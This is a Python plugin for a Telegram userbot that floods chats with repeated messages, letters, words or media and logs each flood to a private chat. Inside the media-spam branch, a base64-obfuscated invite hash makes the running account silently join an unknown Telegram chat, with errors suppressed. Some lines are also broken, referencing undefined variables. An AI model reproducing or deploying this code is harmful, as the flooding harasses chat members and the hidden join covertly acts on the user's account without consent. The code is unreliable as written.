import asyncio
import base64

from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from . import BOTLOG, BOTLOG_CHATID


@bot.on(admin_cmd(pattern="spam (.*)"))
@bot.on(sudo_cmd(pattern="spam (.*)", allow_sudo=True))
async def spammer(event):
    if event.fwd_from:
        return
    reply_to_id = await reply_id(e)
    sandy = await event.get_reply_message()
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    cat = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    if len(cat) == 2:
        spam_message = str(("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)[1])
        await event.delete()
        for _ in range(counter):
            if event.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif reply_to_id.text and event.reply_to_msg_id:
        spam_message = reply_to_id.text
        await event.delete()
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif reply_to_id.media:
        for _ in range(counter):
            sandy = await event.client.send_file(event.chat_id, sandy)
            await unsavegif(event, sandy)
            await asyncio.sleep(sleeptimem)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass
        if BOTLOG:
            if event.is_private:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with {counter} times with below message",
                )
            else:
                await event.client.send_message(
                    BOTLOG_CHATID,
                    "#SPAM\n"
                    + f"Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) with {counter} times with below message",
                )
            sandy = await event.client.send_file(BOTLOG_CHATID, sandy)
            await unsavegif(event, sandy)
        return
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#SPAM\n"
                + f"Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with {counter} messages of \n"
                + f"`{spam_message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#SPAM\n"
                + f"Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat  with {counter} messages of \n"
                + f"`{spam_message}`",
            )


@bot.on(admin_cmd("cspam (.*)"))
@bot.on(sudo_cmd(pattern="cspam (.*)", allow_sudo=True))
async def tmeme(event):
    cspam = str("".join(event.text.split(maxsplit=1)[1:]))
    message = cspam.replace(" ", "")
    await event.delete()
    for letter in message:
        await event.respond(letter)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#CSPAM\n"
                + f"Letter Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with : `{message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#CSPAM\n"
                + f"Letter Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat with : `{message}`",
            )


@bot.on(admin_cmd("wspam (.*)"))
@bot.on(sudo_cmd(pattern="wspam (.*)", allow_sudo=True))
async def tmeme(event):
    wspam = str("".join(event.text.split(maxsplit=1)[1:]))
    message = wspam.split()
    await event.delete()
    for word in message:
        await event.respond(word)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#WSPAM\n"
                + f"Word Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with : `{message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#WSPAM\n"
                + f"Word Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat with : `{message}`",
            )


@bot.on(admin_cmd("delayspam (.*)"))
@bot.on(sudo_cmd(pattern="delayspam (.*)", allow_sudo=True))
async def spammer(event):
    if event.fwd_from:
        return
    input_str = "".join(event.text.split(maxsplit=1)[1:])
    spamDelay = float(input_str.split(" ", 2)[0])
    counter = int(input_str.split(" ", 2)[1])
    spam_message = str(input_str.split(" ", 2)[2])
    await event.delete()
    for _ in range(counter):
        await event.respond(spam_message)
        await asyncio.sleep(spamDelay)
    if BOTLOG:
        if event.is_private:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#DELAYSPAM\n"
                + f"Delay Spam was executed successfully in [User](tg://user?id={event.chat_id}) chat with {spamDelay}s Delay and {counter} times with : `{message}`",
            )
        else:
            await event.client.send_message(
                BOTLOG_CHATID,
                "#DELAYCSPAM\n"
                + f"Delay Spam was executed successfully in {event.chat.title}(`{event.chat_id}`) chat with {spamDelay}s Delay and {counter} times with: `{message}`",
            )


CMD_HELP.update(
    {
        "spam": "**Plugin : **`spam`\
        \n\n**  •  Syntax : **`.spam <count> <text>`\
        \n**  •  Function : **__ Floods text in the chat !!__\
        \n\n**  •  Syntax : **`.spam <count> reply to media`\
        \n**  •  Function : **__Sends the replied media <count> times !!__\
        \nFor above two commands use `.bigspam` instead of spam for spamming more than 50 messages\
        \n\n**  •  Syntax : **`.cspam <text>`\
        \n**  •  Function : **__ Spam the text letter by letter.__\
        \n\n**  •  Syntax : **`.wspam <text>`\
        \n**  •  Function : **__ Spam the text word by word.__\
        \n\n**  •  Syntax : **`.delayspam <delay> <count> <text>`\
        \n**  •  Function : **__ .delayspam but with custom delay.__\
        \n\n\n**Note : Spam at your own risk !!**"
    }
)
